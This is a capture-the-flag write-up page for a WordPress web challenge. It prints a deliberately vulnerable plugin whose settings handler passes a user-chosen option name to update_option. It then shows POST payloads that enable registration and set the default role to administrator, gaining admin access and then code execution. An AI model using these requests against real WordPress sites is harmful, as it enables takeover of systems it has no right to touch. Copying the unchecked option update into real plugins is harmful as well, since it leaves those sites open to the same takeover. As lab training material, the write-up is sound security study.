@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF writeups</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/posts.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+</head>
+<body>
+    <!-- Header will be loaded here -->
+    <div id="header-placeholder"></div>
+    <div class="main-content">
+        <div class="container">
+<h4 id="challenge-details">Challenge details</h4>
+<table>
+<thead>
+<tr>
+<th><strong>Category</strong></th>
+<th>Web</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Challenge Type</strong></td>
+<td>Standalone</td>
+</tr>
+<tr>
+<td><strong>Points</strong></td>
+<td>Dynamic</td>
+</tr>
+<tr>
+<td><strong>Author</strong></td>
+<td>Unknown</td>
+</tr>
+<tr>
+<td><strong>Original Solver</strong></td>
+<td><code>willi34</code></td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>3/10</td>
+</tr>
+</tbody>
+</table>
+<h4 id="overview">Overview</h4>
+<p>The application is a Wordpress installation featuring a custom theme and a custom plugin : </p>
+<pre class="codehilite"><code>├── custom-entrypoint.sh
+├── docker-compose.yml
+├── Dockerfile
+├── flag.txt
+└── src
+    ├── plugins
+    │   └── my-plugin
+    │       ├── assets
+    │       │   ├── script.js
+    │       │   └── style.css
+    │       └── my-plugin.php
+    └── themes
+        └── my-theme
+            ├── comments.php
+            ├── footer.php
+            ├── functions.php
+            ├── header.php
+            ├── images
+            │   ├── Lottie Thimblewhisk.png
+            │   ├── The Festival Lights.png
+            │   ├── Unraveling the Festive Threads.png
+            │   └── Where Did All the Cocoa Supplies Go.png
+            ├── index.php
+            ├── single.php
+            └── style.css
+</code></pre>
+
+<p>The flag we're looking for is inside the <code>/flag.txt</code> inside the container, so we'll need RCE or arbitrary file read to solve this challenge. The Wordpress installation setup and plugin activation are done with the <code>custom-entrypoint.sh</code> entrypoint script.</p>
+<h4 id="analysing-the-custom-plugin">Analysing the custom plugin</h4>
+<p>Here's the PHP source code for the PHP plugin, our main interest :</p>
+<pre><code class="language-php">&lt;?php
+/**
+ * Plugin Name: My Plugin
+ * Plugin URI: https://example.com/my-plugin
+ * Description: A custom WordPress plugin for the challenge
+ * Version: 1.0.0
+ * Author: Challenge Author
+ * Author URI: https://example.com
+ * License: GPL v2 or later
+ * License URI: https://www.gnu.org/licenses/gpl-2.0.html
+ * Text Domain: my-plugin
+ */
+
+// Exit if accessed directly
+if (!defined('ABSPATH')) {
+    exit;
+}
+
+// Define plugin constants
+define('MY_PLUGIN_VERSION', '1.0.0');
+define('MY_PLUGIN_DIR', plugin_dir_path(__FILE__));
+define('MY_PLUGIN_URL', plugin_dir_url(__FILE__));
+ob_start();
+
+function my_auto_login_new_user( $user_id ) {
+    if ( defined( 'WP_CLI' ) &amp;&amp; WP_CLI ) {
+        return;
+    }
+    // 1. Get the user data
+    $user = get_user_by( 'id', $user_id );
+
+    // 2. Set the current user to this new user
+    wp_set_current_user( $user_id, $user-&gt;user_login );
+    wp_set_auth_cookie( $user_id );
+
+    // 3. Redirect to home page (or any other URL)
+    wp_redirect( home_url() );
+    exit;
+}
+add_action( 'user_register', 'my_auto_login_new_user' );
+
+/**
+ * Main plugin class
+ */
+class My_Plugin {
+
+    /**
+     * Constructor
+     */
+    public function __construct() {
+        add_action('wp_enqueue_scripts', array($this, 'enqueue_scripts'));
+        add_action('admin_menu', array($this, 'add_admin_menu'));
+        add_filter('body_class', array($this, 'add_body_class'));
+        add_action(&quot;wp_loaded&quot;, array($this, &quot;init&quot;), 9999);
+    }
+
+    public function init() {
+        if (isset($_GET['settings'])) {
+            $this-&gt;admin_page();
+            exit;
+        }
+    }
+    /**
+     * Enqueue scripts and styles
+     */
+    public function enqueue_scripts() {
+        wp_enqueue_style('my-plugin-style', MY_PLUGIN_URL . 'assets/style.css', array(), MY_PLUGIN_VERSION);
+        wp_enqueue_script('my-plugin-script', MY_PLUGIN_URL . 'assets/script.js', array('jquery'), MY_PLUGIN_VERSION, true);
+    }
+
+    /**
+     * Add admin menu
+     */
+    public function add_admin_menu() {
+        add_menu_page(
+            'My Plugin Settings',
+            'My Plugin',
+            'manage_options',
+            'my-plugin-settings',
+            array($this, 'admin_page'),
+            'dashicons-admin-generic',
+            30
+        );
+    }
+
+    /**
+     * Add body class based on mode
+     */
+    public function add_body_class($classes) {
+        $mode = get_option('my_plugin_dark_mode', 'light');
+        if ($mode === 'dark') {
+            $classes[] = 'dark-mode';
+        }
+        return $classes;
+    }
+
+    /**
+     * Admin page callback
+     */
+    public function admin_page() {
+        // Ensure user is admin
+        if (!is_admin()) {
+            wp_die('Access denied');
+        }
+
+        if (isset($_POST['my_plugin_action'])) {
+            check_admin_referer(&quot;my_plugin_nonce&quot;, &quot;my_plugin_nonce&quot;);
+
+            $mode = sanitize_text_field($_POST['mode']);
+            update_option($_POST['my_plugin_action'], $mode);
+            echo '&lt;div class=&quot;updated&quot;&gt;&lt;p&gt;Mode saved.&lt;/p&gt;&lt;/div&gt;';
+        } elseif (isset($_POST['my_plugin_action']) &amp;&amp; $_POST['my_plugin_action'] === 'reset') {
+            delete_option('my_plugin_dark_mode');
+            echo '&lt;div class=&quot;updated&quot;&gt;&lt;p&gt;Mode reset to default.&lt;/p&gt;&lt;/div&gt;';
+        }
+
+        $current_mode = get_option('my_plugin_dark_mode', 'light');
+        ?&gt;
+        &lt;div class=&quot;wrap&quot;&gt;
+            &lt;h1&gt;My Plugin Settings&lt;/h1&gt;
+            &lt;div class=&quot;card&quot;&gt;
+                &lt;h2&gt;Theme Mode&lt;/h2&gt;
+                &lt;form method=&quot;post&quot; action=&quot;&quot;&gt;
+                    &lt;?php wp_nonce_field('my_plugin_nonce', 'my_plugin_nonce'); ?&gt;
+                    &lt;table class=&quot;form-table&quot;&gt;
+                        &lt;tr valign=&quot;top&quot;&gt;
+                            &lt;th scope=&quot;row&quot;&gt;Select Mode&lt;/th&gt;
+                            &lt;td&gt;
+                                &lt;select name=&quot;mode&quot;&gt;
+                                    &lt;option value=&quot;light&quot; &lt;?php selected($current_mode, 'light'); ?&gt;&gt;Light Mode&lt;/option&gt;
+                                    &lt;option value=&quot;dark&quot; &lt;?php selected($current_mode, 'dark'); ?&gt;&gt;Dark Mode&lt;/option&gt;
+                                &lt;/select&gt;
+                            &lt;/td&gt;
+                        &lt;/tr&gt;
+                    &lt;/table&gt;
+                    &lt;p class=&quot;submit&quot;&gt;
+                        &lt;button type=&quot;submit&quot; name=&quot;my_plugin_action&quot; value=&quot;my_plugin_dark_mode&quot; class=&quot;button button-primary&quot;&gt;Save Changes&lt;/button&gt;
+                        &lt;button type=&quot;submit&quot; name=&quot;my_plugin_action&quot; value=&quot;reset&quot; class=&quot;button button-secondary&quot;&gt;Reset to Default&lt;/button&gt;
+                    &lt;/p&gt;
+                &lt;/form&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+        &lt;?php
+    }
+}
+
+// Initialize the plugin
+new My_Plugin();
+?&gt;
+</code></pre>
+
+<p>This plugin essentially just redirects the user to a custom HTML page to change the theme mode when the <code>settings</code> URL parameter is in the URL. Since it's an admin only page, the plugin checks that the user is a Wordpress admin with this snippet of code :</p>
+<pre class="codehilite"><code class="language-php"> // Ensure user is admin
+if (!is_admin()) {
+    wp_die('Access denied');
+}
+</code></pre>
+
+<p>Then, it will take the mode we selected for the theme via a POST request and update the global Wordpress options (contained in the <code>wp_options</code> database table) based on our values which will control which version of the theme is displayed :</p>
+<pre class="codehilite"><code class="language-php">if (isset($_POST['my_plugin_action'])) {
+    check_admin_referer(&quot;my_plugin_nonce&quot;, &quot;my_plugin_nonce&quot;);
+
+    $mode = sanitize_text_field($_POST['mode']);
+    update_option($_POST['my_plugin_action'], $mode);
+    echo '&lt;div class=&quot;updated&quot;&gt;&lt;p&gt;Mode saved.&lt;/p&gt;&lt;/div&gt;';
+} elseif (isset($_POST['my_plugin_action']) &amp;&amp; $_POST['my_plugin_action'] === 'reset') {
+    delete_option('my_plugin_dark_mode');
+    echo '&lt;div class=&quot;updated&quot;&gt;&lt;p&gt;Mode reset to default.&lt;/p&gt;&lt;/div&gt;';
+}
+</code></pre>
+
+<p>The plugin also has a function that will automatically login users when they register and a custom Wordpress dashboard menu. </p>
+<h4 id="accessing-the-plugin-with-authentication-bypass">Accessing the plugin with authentication bypass</h4>
+<p>To access and exploit the plugin, we'll first need to find a way to become the administrator user or get around the <code>is_admin</code> PHP function that authenticates us as admin :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/CTF/htb/silentsnow/challenge]
+└─$ curl 'http://localhost:1337/?settings=foo'
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en-US&quot;&gt;
+[...]
+&lt;/head&gt;
+&lt;body id=&quot;error-page&quot;&gt;
+        &lt;div class=&quot;wp-die-message&quot;&gt;Access denied&lt;/div&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>If we look at the <a href="https://developer.wordpress.org/reference/functions/is_admin/">documentation</a> for this function, we'll realize that this function doesn't actually verify that the user is an admin, but rather just checks if the request is for an administrative page :</p>
+<pre class="codehilite"><code>Description
+
+Does not check if the user is an administrator; use current_user_can() for checking roles and capabilities.
+
+For more information on this and similar theme functions, check out the Conditional Tags article in the Theme Developer Handbook.
+</code></pre>
+
+<p>We can request for something inside the Wordpress administrative section <code>/wp-admin</code> and find that we now have access to the plugin : 
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/2eae2f2aa7549039b4a38cb7e50474ed5db3700d/uploads/2026-01-06T20-49-16-149Z-wur1p8q7j.png" /></p>
+<h4 id="overwriting-global-wordpress-options">Overwriting global Wordpress options</h4>
+<p>Since there are no glaring RCE or file read vulnirabilities within this plugin, it's same to assume we need to become an actual administrator on this Wordpress instance to solve this challenge. Luckily for us, the plugin never validates what option is passed to the <code>update_option</code> function, instead directly updating the <code>my_plugin_option</code> parameter from our POST request with the value coming from the <code>mode</code> parameter :</p>
+<pre class="codehilite"><code class="language-PHP">[...]
+$mode = sanitize_text_field($_POST['mode']);
+update_option($_POST['my_plugin_action'], $mode);
+[...]
+</code></pre>
+
+<p>This means we can pretty much overwrite any entry in the <code>wp_options</code> table! Checking the <a href="https://developer.wordpress.org/apis/options/">documentation</a> on these options, we can find exactly what we're looking for :</p>
+<pre class="codehilite"><code>- default_role : The default role of users who register at the blog.  
+    subscriber (default)  
+    administrator  
+    editor
+    author
+    contributor
+    Data type: String
+</code></pre>
+
+<p>We can register a user on the instance and directly be logged in as admin because of the auto login functionnality of the plugin! The only problem is that user registration is disabled on default in Wordpress, but this is also an option that can be overwritten in the global options :</p>
+<pre class="codehilite"><code>- users_can_register : Anyone can register  
+    1: Yes  
+    0 : No (default)  
+    Data type: Integer
+</code></pre>
+
+<p>Using a proxy like Burpsuite (or sending the request directly after grabbing a valid nonce from the DOM), we can use the plugin and modify the request to update the option to activate user registration :</p>
+<pre class="codehilite"><code>my_plugin_nonce=094e2ce0f0&amp;_wp_http_referer=%2Fwp-admin%2F%3Fsettings%3Dfoo&amp;mode=1&amp;my_plugin_action=users_can_register
+</code></pre>
+
+<p>We can confirm the success of this operation by visiting the <code>wp-login.php</code> Wordpress login page and chosing to register a user instead :
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/c113fc0acfcc74589717e29acf5ace76c66674b4/uploads/2026-01-06T20-49-40-744Z-202mgreli.png" /></p>
+<p>Then, right before creating our user, we can modify another request to make all new users admins on default :</p>
+<pre class="codehilite"><code>my_plugin_nonce=094e2ce0f0&amp;_wp_http_referer=%2Fwp-admin%2F%3Fsettings%3Dfoo&amp;mode=administrator&amp;my_plugin_action=default_role
+</code></pre>
+
+<p>Now we should have access to the admin section of Wordpress directly after user registration :
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/988055003038fdb712fdf848fda842a592729216/uploads/2026-01-06T20-50-01-508Z-36x4kjeu7.png" /></p>
+<p>From here, there are multiple different ways of getting RCE. I opted to modify the index page of the theme in use to execute a system command that fetched the flag : 
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/2f4f88bbd105c825c192e8a61512328af3c64dc6/uploads/2026-01-06T20-50-19-359Z-aam401hm9.png" /></p>
+<p>Result :
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/f650ee60195685bbb34b4a22c714d7156f4e2352/uploads/2026-01-06T20-50-42-975Z-bb859ln1c.png" /></p>
+<p>flag : <code>HTB{s1l3nt_snow_b3y0nd_tinselwick_t0wn_8875fe4a840b4eccf2ebc22b94065b1a}</code></p>
+    <!-- Footer will be loaded here -->
+        </div>
+    </div>
+    <div id="footer-placeholder"></div>
+    <script src="/js/script.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markup-templating.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js"></script>
+</body>
+</html>
